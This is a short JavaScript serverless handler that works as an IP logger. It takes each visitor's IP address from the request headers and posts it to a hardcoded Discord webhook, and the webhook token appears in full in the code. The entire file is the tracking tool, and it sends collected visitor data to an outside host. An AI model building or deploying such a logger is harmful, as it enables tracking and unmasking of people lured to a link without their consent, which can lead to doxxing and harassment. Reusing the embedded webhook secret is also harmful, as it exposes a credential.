export default async function handler(req, res) {
  // Get IP from headers
  const ipHeader = req.headers['x-forwarded-for'] || '';
  const ip = ipHeader.split(',')[0] || req.socket?.remoteAddress || 'Unknown IP';

  const webhookURL = "https://discord.com/api/webhooks/1420217270629695500/l1c7HRvL9BRkXifKcAmD4BT_C5F4_tCQYEsX6iTlpQLw11JOaQqMCPFBz9thCB3kOD_W";

  try {
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `New visitor IP: ${ip}` })
    });

    if (!response.ok) {
      console.error('Discord webhook error:', response.statusText);
      return res.status(500).send('Failed to send IP to Discord.');
    }

    console.log('IP sent to Discord:', ip);
    res.status(200).send(`IP sent to Discord: ${ip}`);
  } catch (err) {
    console.error('Error sending IP:', err);
    res.status(500).send('Failed to send IP.');
  }
}
